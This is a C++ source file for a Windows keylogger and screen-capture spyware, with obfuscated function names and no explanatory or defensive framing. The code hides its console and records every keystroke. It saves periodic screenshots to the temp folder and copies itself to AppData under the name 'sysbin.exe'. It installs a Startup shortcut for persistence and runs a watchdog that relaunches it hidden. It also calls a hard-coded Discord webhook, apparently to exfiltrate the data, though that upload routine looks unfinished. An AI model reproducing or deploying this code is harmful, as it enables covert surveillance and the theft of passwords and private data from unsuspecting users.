#include <windows.h>
#include <thread>
#include <vector>
#include <string>
#include <fstream>
#include <gdiplus.h>
#include <wininet.h>
#include <shellapi.h>
#include <shlobj.h>
#include <iostream>
#include <tlhelp32.h>

#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Shell32.lib")

using namespace std;
using namespace Gdiplus;

vector<string> _k1_;

void _c1_(const string& _s1_) {
    GdiplusStartupInput _g1_;
    ULONG_PTR _t1_;
    GdiplusStartup(&_t1_, &_g1_, NULL);

    HDC _h1_ = GetDC(NULL);
    HDC _d1_ = CreateCompatibleDC(_h1_);
    int _w1_ = GetSystemMetrics(SM_CXSCREEN);
    int _h2_ = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP _bmp = CreateCompatibleBitmap(_h1_, _w1_, _h2_);
    SelectObject(_d1_, _bmp);
    BitBlt(_d1_, 0, 0, _w1_, _h2_, _h1_, 0, 0, SRCCOPY);

    Bitmap bmp(_bmp, NULL);
    CLSID _png;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &_png);

    wstring _ws(_s1_.begin(), _s1_.end());
    bmp.Save(_ws.c_str(), &_png);

    GdiplusShutdown(_t1_);
    DeleteObject(_bmp);
    DeleteDC(_d1_);
    ReleaseDC(NULL, _h1_);
}

void _k2_() {
    while (true) {
        for (int k = 8; k <= 255; ++k) {
            if (GetAsyncKeyState(k) & 0x8000) {
                string _s(1, (char)k);
                _k1_.push_back(_s);
                this_thread::sleep_for(chrono::milliseconds(50));
            }
        }
        this_thread::sleep_for(chrono::milliseconds(10));
    }
}

void _s1_(const string& _path) {
    ofstream f(_path, ios::out);
    for (const string& e : _k1_) {
        f << e;
    }
    f.close();
}

void _d1_(const string& _log, const string& _img) {
    HINTERNET h = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET c = InternetOpenUrlA(h,
        "https://discord.com/api/webhooks/1363987405622743090/hft3i50AkQjYiNk11Em8k555xc1Itk7XkD3d9nJ6BzwZp-AnSmsGHjADwqt-lMikZR7r",
        NULL, 0, INTERNET_FLAG_RELOAD, 0);
    InternetCloseHandle(c);
    InternetCloseHandle(h);
}

void _b1_() {
    char _tp[MAX_PATH];
    GetTempPathA(MAX_PATH, _tp);

    string _log = string(_tp) + "log.txt";
    string _img = string(_tp) + "sshot.png";

    while (true) {
        this_thread::sleep_for(chrono::seconds(10));
        if (!_k1_.empty()) {
            _s1_(_log);
            _c1_(_img);
            _d1_(_log, _img);
            _k1_.clear();
        }
    }
}

void _a1_() {
    char _cur[MAX_PATH];
    GetModuleFileNameA(NULL, _cur, MAX_PATH);

    char _ap[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, _ap);

    string _dst = string(_ap) + "\\Microsoft\\Windows\\sysbin.exe";

    ifstream src(_cur, ios::binary);
    ofstream dst(_dst, ios::binary);
    dst << src.rdbuf();

    string _lnk = string(_ap) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.lnk";

    IShellLinkA* _sl = nullptr;
    CoInitialize(NULL);
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkA, (void**)&_sl);
    if (SUCCEEDED(hr)) {
        _sl->SetPath(_dst.c_str());
        IPersistFile* pf = nullptr;
        hr = _sl->QueryInterface(IID_IPersistFile, (void**)&pf);
        if (SUCCEEDED(hr)) {
            wstring wlnk(_lnk.begin(), _lnk.end());
            pf->Save(wlnk.c_str(), TRUE);
            pf->Release();
        }
        _sl->Release();
    }
    CoUninitialize();
}

bool _pCheck_() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnap, &pe)) {
        CloseHandle(hSnap);
        return false;
    }

    bool running = false;
    do {
        if (std::wstring(pe.szExeFile) == L"sysbin.exe") {
            running = true;
            break;
        }
    } while (Process32Next(hSnap, &pe));

    CloseHandle(hSnap);
    return running;
}

void _w1_() {
    while (true) {
        this_thread::sleep_for(chrono::seconds(30));
        if (!_pCheck_()) {
            char appData[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
            string target = string(appData) + "\\Microsoft\\Windows\\sysbin.exe";
            ShellExecuteA(NULL, "open", target.c_str(), NULL, NULL, SW_HIDE);
        }
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    FreeConsole();
    _a1_();

    thread _kt(_k2_);
    thread _bt(_b1_);
    thread _wt(_w1_);

    _kt.detach();
    _bt.detach();
    _wt.detach();

    while (true) Sleep(10000);
    return 0;
}
